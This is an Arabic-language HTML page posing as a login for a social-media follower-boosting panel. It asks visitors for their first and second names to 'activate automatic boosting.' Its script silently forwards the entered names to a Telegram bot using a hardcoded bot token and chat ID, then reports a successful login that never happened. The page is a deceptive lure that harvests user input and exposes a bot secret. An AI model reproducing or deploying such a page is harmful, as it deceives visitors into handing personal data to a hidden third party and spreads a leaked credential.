<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMM Panel | زيادة متابعين</title>
    <style>
        :root {
            --primary-color: #712cf9;
            --bg-dark: #0f172a;
        }
        body {
            margin: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-dark);
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .login-card {
            background: rgba(30, 41, 59, 0.7);
            backdrop-filter: blur(10px);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
            width: 100%;
            max-width: 380px;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .logo {
            font-size: 50px;
            margin-bottom: 10px;
        }
        h1 { font-size: 22px; margin-bottom: 5px; color: #fff; }
        p { font-size: 13px; color: #94a3b8; margin-bottom: 25px; }
        
        .input-group { text-align: right; margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-size: 14px; color: #cbd5e1; }
        
        input {
            width: 100%;
            padding: 12px 15px;
            border-radius: 10px;
            border: 1px solid #334155;
            background: #1e293b;
            color: white;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
            transition: 0.3s;
        }
        input:focus { border-color: var(--primary-color); box-shadow: 0 0 0 3px rgba(113, 44, 249, 0.2); }

        button {
            width: 100%;
            padding: 14px;
            background: var(--primary-color);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 10px;
        }
        button:hover { background: #5d21d0; transform: translateY(-2px); }
        
        .status { margin-top: 15px; font-size: 14px; display: none; }
    </style>
</head>
<body>

<div class="login-card">
    <div class="logo">🚀</div>
    <h1>تسجيل الدخول للنظام</h1>
    <p>يرجى إدخال اسمك لتفعيل ميزة الرشق التلقائي</p>

    <div class="input-group">
        <label>الاسم الأول</label>
        <input type="text" id="firstName" placeholder="أدخل اسمك الأول" required>
    </div>

    <div class="input-group">
        <label>الاسم الثاني (اختياري)</label>
        <input type="text" id="lastName" placeholder="أدخل اسمك الثاني">
    </div>

    <button onclick="loginAndSend()">دخول النظام</button>
    <div id="statusMsg" class="status">جاري التحقق من البيانات...</div>
</div>

<script>
    function loginAndSend() {
        // معلومات البوت الخاصة بك
        const botToken = "7546948976:AAETtxJ-ecUKdqVOd4LFI152-IaYxROFLWQ";
        const chatId = "56081692";

        const fName = document.getElementById('firstName').value;
        const lName = document.getElementById('lastName').value || "غير محدد";
        const status = document.getElementById('statusMsg');

        if (!fName) {
            alert("يرجى إدخال الاسم الأول على الأقل");
            return;
        }

        status.style.display = "block";
        status.style.color = "#94a3b8";

        // محتوى الرسالة المرسلة للتليجرام
        const message = `📋 *تسجيل دخول جديد* \n\n👤 الاسم الأول: ${fName} \n👤 الاسم الثاني: ${lName}`;

        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

        fetch(url)
        .then(response => {
            if (response.ok) {
                status.innerHTML = "✅ تم تسجيل الدخول! جاري توجيهك...";
                status.style.color = "#4ade80";
                // يمكنك توجيه المستخدم لصفحة أخرى بعد الإرسال إذا أردت
            } else {
                status.innerHTML = "❌ فشل الاتصال بالسيرفر، حاول لاحقاً.";
                status.style.color = "#f87171";
            }
        })
        .catch(err => {
            console.error(err);
            status.innerHTML = "⚠️ خطأ في الشبكة!";
        });
    }
</script>

</body>
</html>
